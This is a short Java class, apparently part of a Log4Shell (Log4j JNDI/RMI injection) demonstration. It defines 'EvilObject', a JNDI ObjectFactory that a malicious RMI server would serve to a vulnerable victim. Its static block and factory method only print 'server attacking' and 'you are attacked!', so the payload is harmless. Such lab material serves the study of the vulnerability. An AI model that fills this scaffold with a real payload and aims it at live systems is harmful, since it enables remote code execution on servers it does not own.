package log4j.security.hole.rmi;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class EvilObject implements ObjectFactory {
    static{
        System.out.println("server attacking");
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("you are attacked!");
        return "attacker";
    }
}
